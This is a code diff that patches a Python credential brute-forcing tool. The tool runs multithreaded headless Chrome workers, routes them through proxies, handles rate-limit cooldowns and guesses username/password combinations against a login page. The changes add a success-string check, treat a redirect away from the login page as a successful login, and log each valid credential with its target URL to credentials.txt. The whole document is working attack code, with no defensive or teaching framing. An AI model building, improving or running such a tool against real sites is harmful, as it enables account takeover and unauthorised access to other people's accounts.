@@ -120,8 +120,13 @@ parser.add_argument("--threads", type=int, default=1, help="number of threads")
 parser.add_argument("--url", help="login page URL")
 parser.add_argument(
     "--error",
-    default="incorrect",
-    help="error message to check for failed login (default: 'incorrect')",
+    default="",
+    help="error message to check for failed login (default: none)",
+)
+parser.add_argument(
+    "--success",
+    default="",
+    help="success message to verify successful login (if error is inadequate)",
 )
 parser.add_argument(
     "--headless", action="store_true", help="run worker browsers in headless mode"
@@ -555,10 +560,8 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                             found_users.add(user)
                             self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                             try:
-                                with open(
-                                    "credentials.txt", "a", encoding="utf-8"
-                                ) as cf:
-                                    cf.write(f"{user}:{pwd}\n")
+                                with open("credentials.txt", "a", encoding="utf-8") as cf:
+                                    cf.write(f"{ctx['target_url']} - {user}:{pwd}\n")
                             except:
                                 pass
 
@@ -1263,9 +1266,13 @@ if args.interactive:
     threads_in = input("Enter number of threads [default: 1]: ").strip()
     args.threads = int(threads_in) if threads_in.isdigit() else 1
 
-    err_in = input("Enter error string to check (default: 'incorrect'): ").strip()
+    err_in = input("Enter error string to check (default: empty): ").strip()
     if err_in:
         args.error = err_in
+
+    succ_in = input("Enter success string to check (default: empty): ").strip()
+    if succ_in:
+        args.success = succ_in
 
     delay_in = input(
         "Enter general delay between attempts in seconds [default: 0]: "
@@ -1369,7 +1376,8 @@ if (
     and not TARGET_URL.startswith("https://")
 ):
     TARGET_URL = "http://" + TARGET_URL
-ERROR_MSG = args.error.lower()
+ERROR_MSG = args.error.lower() if args.error else None
+SUCCESS_MSG = args.success.lower() if args.success else None
 LIMIT_TEXT = args.limit_text.lower() if args.limit_text else None
 COOLDOWN = args.cooldown
 DELAY = args.delay
@@ -1552,11 +1560,15 @@ def worker():
         options.add_argument(f"--proxy-server={proxy}")
 
     if RUN_HEADLESS:
-        options.add_argument("--headless")
+        options.add_argument("--headless=new")
         options.add_argument("--disable-gpu")
         options.add_argument("--window-size=1920x1080")
 
-    thread_driver = webdriver.Chrome(options=options)
+    try:
+        thread_driver = webdriver.Chrome(options=options)
+    except Exception as e:
+        print(f"[-] Thread initialization failed: {e}")
+        return
 
     try:
         while not q.empty() and not found and not _GLOBAL_STOP.is_set():
@@ -1647,10 +1659,29 @@ def worker():
                         # It explicitly failed
                         continue
 
+                    # If success string is defined, explicitly check it
+                    if SUCCESS_MSG:
+                        if SUCCESS_MSG not in page_source:
+                            # Not found explicit success
+                            continue
+                        else:
+                            pass # We found success!
+                    
+                    # Also consider a win if the URL changed to a non-login page and no error found
+                    elif current_url != TARGET_URL and "login" not in current_url.lower():
+                        pass # Redirected away from login forms!
+                    elif ERROR_MSG:
+                        pass # Valid by elimination
+
                     # If we got here, the explicit fail message is missing.
                     # It might be a win. Alternatively, check if URL changed to something unexpected.
                     if not found:
                         print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
+                        try:
+                            with open("credentials.txt", "a", encoding="utf-8") as cf:
+                                cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
+                        except Exception as e:
+                            print(f"[-] Could not save credential: {e}")
                         found = True
 
                         # Clear the queue so other threads stop grabbing new combos
